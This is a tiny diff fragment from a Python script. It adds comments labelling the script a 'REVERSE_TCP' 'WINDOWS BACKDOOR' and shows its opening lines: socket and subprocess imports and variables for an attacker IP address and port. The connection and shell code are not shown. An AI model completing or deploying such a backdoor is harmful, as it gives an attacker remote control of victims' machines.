@@ -1,3 +1,5 @@
+###REVERSE_TCP Script###
+####WINDOWS BACKDOOR####
 import socket, subprocess, os
 attacker_ip = "192.168.0.101"        
 attacker_port = 8080                
